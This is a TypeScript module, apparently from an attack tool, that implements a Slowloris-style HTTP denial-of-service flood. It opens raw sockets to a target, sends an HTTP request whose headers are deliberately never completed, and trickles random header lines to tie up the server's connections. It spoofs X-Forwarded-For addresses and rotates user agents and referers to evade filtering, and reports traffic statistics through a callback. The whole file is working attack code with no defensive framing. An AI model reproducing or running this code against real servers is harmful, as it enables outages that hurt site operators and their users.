import * as net from "net"
import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randStr(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
  let s = ""
  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]
  return s
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

function parseUrl(url: string): { host: string; port: number; path: string } {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  return {
    host: u.hostname,
    port: parseInt(u.port) || 80,
    path: u.pathname || "/",
  }
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const { host, port, path } = parseUrl(url)
  const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${randomChoice(USER_AGENTS)}\r\nReferer: ${randomChoice(REFERERS)}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: keep-alive\r\n`

  const payloadBytes = Buffer.byteLength(payload)
  const run = () => {
    return new Promise<void>((resolve) => {
      const sock = net.createConnection({ host, port }, () => {
        sock.write(payload)
        onStats(1, payloadBytes)
        const keep = `X-a: ${Math.floor(Math.random() * 5000)}\r\n`
        const iv = setInterval(() => {
          try {
            sock.write(keep)
            onStats(0, keep.length)
          } catch {
            clearInterval(iv)
          }
        }, rpc / 15)
        setTimeout(() => {
          clearInterval(iv)
          sock.destroy()
          resolve()
        }, 5000)
      })
      sock.on("error", () => resolve())
      sock.setTimeout(10000, () => {
        sock.destroy()
        resolve()
      })
    })
  }

  await run()
}
